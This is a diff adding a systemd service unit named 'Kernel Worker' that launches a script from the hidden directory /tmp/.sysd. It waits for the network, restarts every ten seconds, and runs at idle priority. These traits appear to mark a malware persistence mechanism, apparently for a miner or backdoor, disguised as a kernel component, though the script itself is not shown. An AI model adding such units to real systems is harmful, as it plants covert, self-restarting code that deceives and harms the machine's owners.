@@ -1,0 +1,18 @@
+[Unit]
+Description=Kernel Worker
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/tmp/.sysd/run.sh
+Restart=always
+RestartSec=10
+Nice=19
+CPUSchedulingPolicy=batch
+IOSchedulingClass=idle
+OOMPolicy=continue
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
